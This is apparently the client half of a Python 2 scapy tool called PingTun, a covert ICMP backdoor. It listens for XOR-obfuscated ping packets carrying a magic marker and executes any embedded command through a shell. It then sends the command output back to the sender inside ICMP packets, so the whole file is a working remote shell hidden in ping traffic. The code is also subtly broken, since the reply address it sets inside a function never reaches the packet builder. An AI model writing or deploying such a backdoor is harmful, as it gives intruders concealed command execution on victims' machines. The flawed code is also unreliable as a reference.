from scapy.all import *
import sys

if len(sys.argv) != 2:
        print "[PingTun] Usage: python2 client.py <interface>"
        print "[PingTun] Exiting..."
        exit()

xor = "\x42\x42\x42\x42"
magic = "\xde\xad\xbe\xef"
ping = "\xaa\xab\xac\xad"
port = "\xba\xbb\xbc\xbd"
shell = "\xca\xcb\xcc\xcd"

source = ""

def action(pkt):
	buff = XOR(pkt.load)

	if buff[0:4] == magic:
		source = pkt.src
		if buff[4:8] == ping:
			print "Ping"
		elif buff[4:8] == port:
			print "Port"
		elif buff[4:8] == shell:
			command_shell(buff[8:])

def packet_builder(data):
	return Ether() / IP(dst=source) / ICMP() / (XOR(magic + data))

def XOR(p):
        buff = ""
        for i in range(0,len(p)):
                buff += chr(ord(p[i]) ^ ord(xor[i % 4]))
        return buff

def command_shell(data):
	print data
	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
	stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	
	value = proc.stdout.read() + proc.stderr.read()

	sendp(packet_builder(shell + value))

sniff(iface=sys.argv[1],filter="icmp",prn=action)
